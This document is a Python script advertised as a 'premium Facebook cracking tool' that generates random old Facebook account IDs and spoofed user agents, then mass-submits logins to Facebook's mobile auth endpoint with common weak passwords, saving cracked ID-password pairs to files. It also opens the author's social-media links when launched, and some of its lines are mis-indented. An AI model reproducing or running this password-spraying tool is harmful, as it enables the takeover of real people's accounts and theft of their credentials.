import os
import datetime
import time
import sys
import rae
import subprocess
import platform
import struct
import string
import uuid
import base64
import hashlib
import zlib
import json
import ssl
import certifi
import socket
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred
import requests

os.system('pkg install espeak')

loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]

y="\x1b[38;5;46m";g="\x1b[38;5;46m";s="\x1b[38;5;46m";r="\x1b[38;5;46m";w="\033[1;97m"

import requests,random
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500'])

# Method 1: Basic Android UAs
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' TL-tl; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Method 2: Windows UAs
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

# Generate Windows UAs
for _ in range(1000):
    ugen.append(windows())

# Method 3: Samsung Android UAs
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
    y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
    c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    aalhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(aalhaj)

# Method 4: Realme Android UAs  
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8','9','10','11','12','13','14','15'])
    y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3350'])
    c='Build/TQ1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    alhajc=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(alhajc)

# Method 5: Tecno Android UAs
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5','6','7','8','9','10','11','12','13','14','15'])
    xs='TECNO'
    nx=random.choice(['CE8','KG5p','IN6','IN2','CE9','IN1','BD4h','K8','CE7','A571LS','BE8','BD4j','BD3','L6502S','RC6'])
    c='Build/TQ1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,150)
    h='Mobile Safari/537.36'
    alhajj=(f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
    ugen.append(alhajj)

# Method 6: Simple UA function
def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

# Generate simple UAs
for _ in range(500):
    ugen.append(ua())

# Method 7: Facebook App UAs
for xd in range(10000):  
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8.1.0','9','10','11','12','13'])
    c='SM-G960N Build/QP1A.190711.020; wv)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e=random.randrange(73,100)
    f='0'
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
    uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)

# Method 8: Xiaomi UAs
for agenku in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2101K6G','M2006C3MII','2201116PG'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)
      
   
try:
    if platform.system() == "Linux":
        os.system('xdg-open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('xdg-open https://wa.me/923079741690')
    elif platform.system() == "Windows":
        os.system('start https://www.facebook.com/profile.php?id=100004682100211')
        os.system('start https://wa.me/923079741690')
    elif platform.system() == "Darwin":  # macOS
        os.system('open https://www.facebook.com/profile.php?id=100004682100211')
        os.system('open https://wa.me/923079741690')
except:
    pass  # Silent fail if browser open nahi ho sake

def linex():
    print(f'\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def line():
    print(f'\r\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Logo with WHITE text + GREEN styling
logo = f"""
\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m║    ███╗░░░███╗░█████╗░░█████╗░███████╗    ║
\x1b[38;5;46m║    ████╗░████║██╔══██╗██╔══██╗╚════██║    ║
\x1b[38;5;46m║    ██╔████╔██║███████║███████║░░███╔═╝    ║
\x1b[38;5;46m║    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░    ║
\x1b[38;5;46m║    ██║░╚═╝░██║██║░░██║██║░░██║███████╗    ║
\x1b[38;5;46m║    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ║
\x1b[38;5;46m║                                           ║
\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[38;5;46m╔═══════════════════════════════════════════╗
\x1b[38;5;46m║     \033[1;97m[ PREMIUM FACEBOOK CRACKING TOOL ]     \x1b[38;5;46m║
\x1b[38;5;46m╚═══════════════════════════════════════════╝

\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ 🔥
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+92-307-9741690
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv2.2 PREMIUM
\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def clear():
    os.system('clear')
    print(logo)


def main():
	clear()
	try:
		os.system('espeak -a 300 "Welcome to MAAZ tools"')
	except:
		pass
	
	animation = ["[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]", "[\x1b[38;5;46m■■\033[1;97m□□□□□□□□]", "[\x1b[38;5;46m■■■\033[1;97m□□□□□□□]", "[\x1b[38;5;46m■■■■\033[1;97m□□□□□□]", "[\x1b[38;5;46m■■■■■\033[1;97m□□□□□]", "[\x1b[38;5;46m■■■■■■\033[1;97m□□□□]", "[\x1b[38;5;46m■■■■■■■\033[1;97m□□□]", "[\x1b[38;5;46m■■■■■■■■\033[1;97m□□]", "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]", "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"]
	
	for i in range(30):
		time.sleep(0.1)
		sys.stdout.write(f"\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \x1b[38;5;46mLOADING...\033[1;97m " + animation[i % len(animation)] +"\033[1;97m ")
		sys.stdout.flush()
	
	clear()
	print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m2009\x1b[38;5;46m/\x1b[38;5;46m2010\x1b[38;5;46m]\033[1;97m')
	print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m2011\x1b[38;5;46m/\x1b[38;5;46m2012\x1b[38;5;46m]\033[1;97m')
	print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m2013\x1b[38;5;46m/\x1b[38;5;46m2014\x1b[38;5;46m]\033[1;97m')
	print(f'\x1b[38;5;46m[\033[1;97m0\x1b[38;5;46m] \033[1;97mEXIT PROGRAM\033[1;97m')
	linex()
	
	ch = input(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
	
	if ch in ('1','01','11','a','A'):
		OLD_CLONING()
	elif ch in ('2','02','22','b','B'):
		MIX_CLONING()
	elif ch in ('3','03','33','c','C'):
		RANDOM_CLONING()
	elif ch in ('0','00'):
		print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTHANKS FOR USING MAAZ TOOLS!')
		try:
			os.system('espeak -a 300 "Thanks for using MAAZ tools"')
		except:
			pass
		sys.exit()
	else:
		print(f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID SELECTION!')
		time.sleep(2)
		main()
 
def OLD_CLONING():
    user=[]
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    try:
        limit=input(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
        limit = int(limit)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER')
        time.sleep(2)
        OLD_CLONING()
        return
    linex()
    year_code = '10000'
    for i in range(limit):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=25) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}')
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
        	uid=year_code+mal
        	jihad.submit(login1,uid)
    line();print(f'\r\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!');linex();print(f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m');main()

def MIX_CLONING():
    user=[]
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    try:
        limit=input(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
        limit = int(limit)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER')
        time.sleep(2)
        MIX_CLONING()
        return
    linex()
    year_code = '100001'
    for i in range(limit):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=25) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}')
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login2,uid)
    line();print(f'\r\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!');linex();print(f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m');main()

def RANDOM_CLONING():
    user=[]
    clear()
    print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
    linex()
    try:
        limit=input(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
        limit = int(limit)
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER')
        time.sleep(2)
        RANDOM_CLONING()
        return
    linex()
    year_code = '100002'
    for i in range(limit):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=25) as jihad:
        clear()
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}')
        print(f'\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login3,uid)            
    line();print(f'\r\x1b[38;5;46m[\033[1;97m👍🏻\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!');linex();print(f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m');main()

def login1(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:
                print(f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                try:
                    os.system('espeak -a 300 "Cracked Ok id"')
                except:
                    pass
                try:
                    open("/sdcard/OLD-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                except:
                    open("OLD-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
		print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')    
                cps.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)

def login2(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB2\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:
                print(f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                try:
                    os.system('espeak -a 300 "Cracked Ok id"')
                except:
                    pass
                try:
                    open("/sdcard/MIX-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                except:
                    open("MIX-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in rp.get("error", {}).get("message", ""):
                print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)

def login3(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB3\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:
                print(f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                try:
                    os.system('espeak -a 300 "Cracked Ok id"')
                except:
                    pass
                try:
                    open("/sdcard/RANDOM-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                except:
                    open("RANDOM-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
		print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')  
                cps.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
